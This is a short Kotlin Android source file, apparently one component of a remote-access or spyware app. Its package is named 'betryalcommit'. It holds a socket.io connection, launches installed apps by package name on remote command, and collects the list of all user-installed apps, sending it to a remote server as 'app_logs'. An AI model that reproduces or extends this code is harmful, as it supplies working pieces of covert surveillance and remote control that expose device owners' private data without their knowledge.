package com.example.betryalcommit

import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import io.socket.client.Socket
import org.json.JSONObject

class packagefun(private val context: Context, private val webSocket: Socket) {
     fun launchApp(packageName: String ) {
        val targetPackageName = packageName
        val packageManager = context.getPackageManager()
         val intent = packageManager.getLaunchIntentForPackage(targetPackageName)
         if (intent != null) {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
         }else
            {
             null
            }

    }

    fun Gameterminator(packageName: String ) {
        val packageManager = context.packageManager
        val settingsIntent = packageManager.getLaunchIntentForPackage(packageName)
        settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(settingsIntent)
    }


    fun applog(): List<String> {
        val packages = mutableListOf<String>("all apps: \n\n");
        val pm = context.packageManager
        val installedApps = pm.getInstalledPackages(PackageManager.GET_META_DATA)
        for (packageInfo in installedApps) {
            if ((packageInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
                packages += packageInfo.packageName + " " + packageInfo.applicationInfo.loadLabel(pm)
                    .toString() + "\n\n"
            }
        }

        val jsontext = JSONObject()
        jsontext.put("type","app_logs")
        jsontext.put("data",packages.toString());
        webSocket.emit("response",jsontext.toString())
        return packages
    }

}


